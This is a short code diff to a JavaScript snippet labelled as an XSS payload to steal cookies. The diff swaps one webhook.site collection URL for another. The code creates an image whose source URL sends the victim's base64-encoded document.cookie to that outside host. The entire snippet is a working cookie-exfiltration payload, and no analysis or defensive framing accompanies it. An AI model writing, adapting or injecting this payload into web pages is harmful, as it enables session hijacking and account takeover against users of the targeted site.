@@ -1,3 +1,3 @@
 // XSS Payload to steal cookies
 var img = new Image();
-img.src = 'https://webhook.site/9d455d5a-6bfc-43f8-a740-a0b11ceaa636?data=' + btoa(document.cookie);
+img.src = 'https://webhook.site/e90c3d47-98e7-4b4f-b262-1df004ac39fc?data=' + btoa(document.cookie);
